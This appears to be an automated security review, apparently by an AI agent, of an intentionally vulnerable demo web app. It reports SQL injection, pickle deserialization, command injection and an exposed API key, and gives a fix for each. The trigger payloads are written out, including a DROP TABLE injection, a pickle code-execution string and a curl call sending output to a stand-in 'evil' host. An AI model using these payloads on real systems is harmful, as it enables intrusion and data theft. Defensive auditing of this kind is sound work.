Memory tools confirm all four known true-positive signatures match this file at high confidence. Proceeding to final review.

---

**Verdict:** REQUEST CHANGES

**Score:** 2/100 — four trivially exploitable critical vulnerabilities in five endpoints.

### Summary

This file is a deliberately insecure demo, but as the gate I treat it as production code. Every endpoint contains a critical vulnerability. None of this should merge.

### Blocking

All four findings below are blocking. Each has a concrete one-request trigger path.

### Security audit

| # | Concern | Severity |
|---|---------|----------|
| 1 | SQL injection (CWE-89) | Critical |
| 2 | Unsafe deserialization (CWE-502) | Critical |
| 3 | Command injection (CWE-78) | Critical |
| 4 | Secrets exposure (CWE-200) | High |

### Key findings

**1. SQL Injection — `GET /search`** `demo/insecure/app.py:14`

- Trigger: `GET /search?q='; DROP TABLE items; --`
- `request.args.get("q")` flows unsanitized into an f-string: `cur.execute(f"SELECT * FROM items WHERE name = '{q}'")`
- Attacker controls the full SQL statement. Data exfiltration, table drop, or UNION injection all work.
- Fix: parameterized query — `cur.execute("SELECT * FROM items WHERE name = ?", (q,))`
- Memory corroboration: `sqli-search` TP, effective score 0.83, CWE-89.

**2. Unsafe Deserialization — `POST /load`** `demo/insecure/app.py:22`

- Trigger: `POST /load` with a pickled `__reduce__` payload (e.g. `cos\nsystem\n(S'id'\ntR.`)
- `pickle.loads(request.data)` on attacker-controlled bytes gives arbitrary code execution.
- No authentication, no integrity check, no allowlist.
- Fix: never deserialize untrusted pickle. Use JSON or a safe serialization format.
- Memory corroboration: `pickle-load` TP, effective score 0.79, CWE-502.

**3. Command Injection — `GET /run`** `demo/insecure/app.py:28`

- Trigger: `GET /run?cmd=cat /etc/passwd; curl http://evil/$(id)`
- `subprocess.check_output(cmd, shell=True)` with attacker-controlled `cmd` yields full RCE.
- Fix: use `shell=False` with an argument list, or validate against an allowlist of commands.
- Memory corroboration: `cmdi-run` TP, effective score 0.81, CWE-78.

**4. Secrets Exposure — `GET /secret`** `demo/insecure/app.py:34`

- Trigger: `GET /secret` — anyone on the network can read `OPENROUTER_API_KEY`.
- Exposes a live API credential in plaintext over an unauthenticated endpoint.
- Fix: remove the endpoint. If a health check is needed, never return secret values.
- Memory corroboration: `secret-exposure` TP, effective score 0.81, CWE-200/CWE-798.

### Tests & risk

- **No tests present.** All four paths are completely untested.
- Risk: deploy this and you lose data + secrets + shell within minutes of exposure.

### What I checked

- Full file: `demo/insecure/app.py` (35 lines, 4 endpoints)
- Memory archival search (`sql OR pickle OR secret`) — 8 hits, all 4 TPs matched
- Memory temporal graph (hops=2) — confirmed co-path clustering of all 4 TPs
- No FP patterns on file

### Multi-lens checklist

| Lens | Status | Note |
|------|--------|------|
| Injection | **concern** | SQLi + command injection both present |
| Auth / access control | **concern** | No auth on any endpoint; secret exposed publicly |
| Secrets / sensitive data | **concern** | API key returned over unauthenticated GET |
| Unsafe deserialization | **concern** | pickle.loads on raw request body |
| XSS / output encoding | n/a | No HTML rendering context |
| CSRF | n/a | No state-changing GET; moot given no auth |
| SSRF | n/a | No outbound fetch from user input |
| Path traversal | n/a | No file-path from user input |
| Crypto misuse | n/a | No crypto operations |
| Supply chain | n/a | No new dependency changes |

— **Torii Gate**
